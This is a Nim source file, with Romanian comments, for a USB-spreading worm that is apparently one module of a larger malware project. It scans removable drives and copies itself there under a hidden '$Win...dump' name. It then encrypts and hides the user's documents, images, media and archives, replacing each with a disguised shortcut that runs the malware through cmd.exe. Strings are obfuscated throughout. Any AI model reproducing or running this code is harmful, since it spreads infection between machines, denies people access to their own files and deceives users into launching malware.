## aici o sa fac o func cu care infectez usburi
## 
## o sa am nev de asta
## key: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced
## value: Hidden = 2
## 
## ca sa nu se vada fisierele ascunse puse pe drive
## 
## TODO: termina asta

from os import walkDirRec
from os import splitFile
from os import getAppFilename
from os import copyFile
from os import `/`
from os import getEnv
from os import existsFile
from os import sleep

from ../functions/removeFile import removeFileOrSleep

from bitops import bitor

from winim/inc/windef import DWORD
from winim/inc/windef import FILE_ATTRIBUTE_READONLY
from winim/inc/windef import FILE_ATTRIBUTE_HIDDEN
from winim/inc/windef import FILE_ATTRIBUTE_NOT_CONTENT_INDEXED
from winim/inc/windef import FILE_ATTRIBUTE_SYSTEM
from winim/inc/windef import UINT
from winim/inc/windef import PULARGE_INTEGER
from winim/inc/windef import LPCWSTR
from winim/inc/windef import MAX_PATH
from winim/inc/windef import PVOID
from winim/inc/windef import LPWSTR

from winim/inc/winbase import GetFileAttributes
from winim/inc/winbase import SetFileAttributes
from winim/inc/winbase import GetDriveTypeW
from winim/inc/winbase import DRIVE_REMOVABLE
from winim/inc/winbase import GetDiskFreeSpaceExW
from winim/inc/winbase import GetVolumeInformationW

from winim/inc/shellapi import IShellLink
from winim/inc/shellapi import CLSID_ShellLink
from winim/inc/shellapi import IID_IShellLink
from winim/inc/shellapi import winimConverterIShellLinkWToIUnknown
from winim/inc/shellapi import SetPath
from winim/inc/shellapi import SetArguments
from winim/inc/shellapi import SetIconLocation
from winim/inc/shellapi import SetShowCmd

from winim/inc/objbase import Save
from winim/inc/objbase import Release
from winim/inc/objbase import QueryInterface
from winim/inc/objbase import winimConverterIPersistFileToIUnknown
from winim/inc/objbase import IPersistFile
from winim/inc/objbase import CoInitialize
from winim/inc/objbase import CoUninitialize
from winim/inc/objbase import CoCreateInstance
from winim/inc/objbase import CLSCTX_LOCAL_SERVER
from winim/inc/objbase import IID_IPersistFile

from winim/winstr import winstrConverterStringToLPWSTR
from winim/winstr import winstrConverterWStringToLPWSTR
from winim/winstr import newWString
from winim/winstr import `$`

from winim/utils import `&`
from winim/utils import winimConverterBooleanToBOOL

from ../more/xxtea import encrypt
import ../functions/hideString

from ../flags import INFECT_THREAD_CHECK_INTERVAL
from ../flags import INFECT_ENCRYPTION_KEY

type Icons = enum
  shell32, imageres, wmploc

const extensions = [
  (e".mp3", wmploc, 60),     # MP3 audio file
  (e".mpa", shell32, 0),     # MPEG-2 audio file
  (e".wav", wmploc, 62),     # WAV file
  (e".7z", shell32, 0),      # 7-Zip compressed file
  (e".arj", shell32, 0),     # ARJ compressed file
  (e".deb", shell32, 0),     # Debian software package file
  (e".pkg", shell32, 0),     # Package file
  (e".rar", shell32, 0),     # RAR file
  (e".rpm", shell32, 0),     # Red Hat Package Manager
  (e".tar.gz", shell32, 0),  # Tarball compressed file
  (e".z", shell32, 0),       # Z compressed file
  (e".zip", shell32, 0),     # Zip compressed file"
  (e".bin", shell32, 0),     # Binary disc image
  (e".dmg", shell32, 0),     # macOS X disk image
  (e".iso", shell32, 0),     # ISO disc image
  (e".toast", shell32, 0),   # Toast disc image
  (e".csv", shell32, 0),     # Comma separated value file
  (e".dbf", shell32, 0),     # Database file
  (e".log", shell32, 0),     # Log file
  (e".mdb", shell32, 0),     # Microsoft Access database file
  (e".sav", shell32, 0),     # Save file (e.g., game save file)
  (e".sql", shell32, 0),     # SQL database file
  (e".tar", shell32, 0),     # Linux / Unix tarball file archive
  (e".xml", shell32, 0),     # XML file
  (e".email", shell32, 0),   # Outlook Express e-mail message file.
  (e".eml", shell32, 0),  # E-mail message file from multiple e-mail clients, including Gmail.
  (e".emlx", shell32, 0),    # Apple Mail e-mail file.
  (e".msg", shell32, 0),     # Microsoft Outlook e-mail message file.
  (e".oft", shell32, 0),     # Microsoft Outlook e-mail template file.
  (e".ost", shell32, 0),     # Microsoft Outlook offline e-mail storage file.
  (e".pst", shell32, 0),     # Microsoft Outlook e-mail storage file.
  (e".vcf", shell32, 0),     # E-mail contact file.
  (e".apk", shell32, 0),     # Android package file
  (e".bat", imageres, 64),   # Batch file
  (e".bin", shell32, 0),     # Binary file
  (e".cgi", shell32, 0),
  (e".pl", shell32, 0),      # Perl script file
  (e".com", shell32, 0),     # MS-DOS command file
  (e".exe", imageres, 11),   # Executable file
  (e".gadget", shell32, 0),  # Windows gadget
  (e".jar", shell32, 0),     # Java Archive file
  (e".msi", imageres, 163),  # Windows installer package
  (e".py", shell32, 0),      # Python file
  (e".wsf", shell32, 0),     # Windows Script File
  (e".ai", shell32, 0),      # Adobe Illustrator file
  (e".bmp", imageres, 66),   # Bitmap image
  (e".gif", imageres, 67),   # GIF image
  (e".ico", shell32, 0),     # Icon file
  (e".jpeg", imageres, 68),
  (e".jpg", imageres, 68),   # JPEG image
  (e".png", imageres, 79),   # PNG image
  (e".ps", shell32, 0),      # PostScript file
  (e".psd", shell32, 0),     # PSD image
  (e".svg", shell32, 0),     # Scalable Vector Graphics file
  (e".tif", imageres, 160),
  (e".tiff", imageres, 160), # TIFF image
  (e".key", shell32, 0),     # Keynote presentation
  (e".odp", shell32, 0),     # OpenOffice Impress presentation file
  (e".pps", shell32, 0),     # PowerPoint slide show
  (e".ppt", shell32, 0),     # PowerPoint presentation
  (e".pptx", shell32, 0),    # PowerPoint Open XML presentation
  (e".ods", shell32, 0),     # OpenOffice Calc spreadsheet file
  (e".xls", shell32, 0),     # Microsoft Excel file
  (e".xlsm", shell32, 0),    # Microsoft Excel file with macros
  (e".xlsx", shell32, 0),    # Microsoft Excel Open XML spreadsheet file
  (e".icns", shell32, 0),    # macOS X icon resource file
  (e".ico", shell32, 0),     # Icon file
  (e".msi", shell32, 0),     # Windows installer package
  (e".3g2", shell32, 0),     # 3GPP2 multimedia file
  (e".3gp", shell32, 0),     # 3GPP multimedia file
  (e".avi", wmploc, 59),     # AVI file
  (e".flv", shell32, 0),     # Adobe Flash file
  (e".h264", shell32, 0),    # H.264 video file
  (e".m4v", shell32, 0),     # Apple MP4 video file
  (e".mkv", shell32, 0),     # Matroska Multimedia Container
  (e".mov", shell32, 0),     # Apple QuickTime movie file
  (e".mp4", shell32, 0),     # MPEG4 video file
  (e".mpg", wmploc, 61),     # MPEG video file
  (e".mpeg", wmploc, 61),    # MPEG video file
  (e".rm", shell32, 0),      # RealMedia file
  (e".swf", shell32, 0),     # Shockwave flash file
  (e".vob", shell32, 0),     # DVD Video Object
  (e".wmv", wmploc, 64),     # Windows Media Video file
  (e".doc", shell32, 0),
  (e".docx", shell32, 0),    # Microsoft Word file
  (e".odt", shell32, 0),     # OpenOffice Writer document file
  (e".pdf", shell32, 0),     # PDF file
  (e".rtf", shell32, 0),     # Rich Text Format
  (e".tex", shell32, 0),     # A LaTeX document file
  (e".txt", imageres, 97),   # Plain text file
  (e".wpd", shell32, 0),     # WordPerfect document
]


proc setAttributes(attr: DWORD): DWORD =
  result = bitor(attr, FILE_ATTRIBUTE_READONLY)
  result = bitor(result, FILE_ATTRIBUTE_HIDDEN)
  result = bitor(result, FILE_ATTRIBUTE_NOT_CONTENT_INDEXED)
  result = bitor(result, FILE_ATTRIBUTE_SYSTEM)

proc hideFile(path: string): void =
  let attr: DWORD = GetFileAttributes(path)

  let newAttr: DWORD = setAttributes(attr)

  discard SetFileAttributes(path, newAttr)

proc createShortcut(sys32: string, programPath: string, savePath: string,
    iconPath: string, iconIndex: int, encryptedFilePath: string): void =
  var
    pIL: ptr IShellLink
    pPF: ptr IPersistFile

  discard CoCreateInstance(&CLSID_ShellLink, nil, CLSCTX_LOCAL_SERVER,
      &IID_IShellLink, cast[ptr PVOID](&pIL))

  discard pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))

  discard pIL.SetPath(sys32 / d e"cmd.exe")
  discard pIL.SetArguments(
    ## d(e("")) is different from d e"", see hideString.nim
    d(e("/c \"start \"\"\"\" \"")) & programPath & d(e("\" \"")) &
        encryptedFilePath & d(e("\"\""))
  )
# /c "start """" "D:\$WinDrive.dump" "D:\abi.txt""
  discard pIL.SetIconLocation(iconPath, int32 iconIndex)

  discard pIl.SetShowCmd(7) # start minimized

  discard pIL.Release()

  discard pPF.Save(savePath, true)

  discard pPF.Release()

proc encryptFile(filePath: string): void =
  # save file contents
  let data: string = readFile(filePath)

  # wait to remove the original file
  removeFileOrSleep(filePath)

  # write encrypted file
  writeFile(filePath, encrypt(data, d INFECT_ENCRYPTION_KEY))

proc checkDrive(dest: string, drivePath: string): void =
  let sys32 = getEnv(d e"SystemRoot") / d e"System32"
  for path in walkDirRec(drivePath):
    let (dir, name, fileExt) = splitFile(path)

    for (extEncrypted, icon, index) in extensions:
      let ext = d extEncrypted
      if fileExt == ext: # valid extension
        encryptFile(path)
        hideFile(path)

        var iconPath: string

        case icon:
        of shell32:
          iconPath = sys32 / d e"shell32.dll"
        of imageres:
          iconPath = sys32 / d e"imageres.dll"
        of wmploc:
          iconPath = sys32 / d e"wmploc.dll"

        createShortcut(sys32, dest, dir / name & d e".lnk", iconPath, index,
            path)
        break


proc searchForUSB(): void =
  let appName: string = getAppFilename()
  for letter in d e"DEFGHIJKLMNOPQRSTUVWXYZ":
    let drivePath: string = letter & d e":\"
    let driveType: UINT = GetDriveTypeW(drivePath)

    if driveType == DRIVE_REMOVABLE:
      var freeSpaceInBytes: int64
      discard GetDiskFreeSpaceExW(drivePath, cast[PULARGE_INTEGER](
          addr freeSpaceInBytes), nil, nil)

      if freeSpaceInBytes div 1000000 >= 2: # if at least 2mb free
        var lpVolumeNameBuffer: LPCWSTR = newWString(MAX_PATH)

        discard GetVolumeInformationW(drivePath, lpVolumeNameBuffer, MAX_PATH,
            nil, nil, nil, nil, 0)

        var driveName: string = $lpVolumeNameBuffer

        if driveName == "":
          driveName = d e"Drive"

        let dest: string = drivePath / d(e("$Win")) & driveName & d(e(".dump"))
        ## possible names:
        ## $Win
        ## $WinSearch
        ## $WinQuery
        ## $WinFind
        if not existsFile(dest): # daca ii deja infectat lasa l in pace
          copyFile(appName, dest)
          hideFile(dest)
          checkDrive(dest, drivePath)

proc initInfectThread*(): void {.thread.} =
  CoInitialize(nil)

  while true:
    searchForUSB()
    sleep(INFECT_THREAD_CHECK_INTERVAL)

  CoUninitialize()
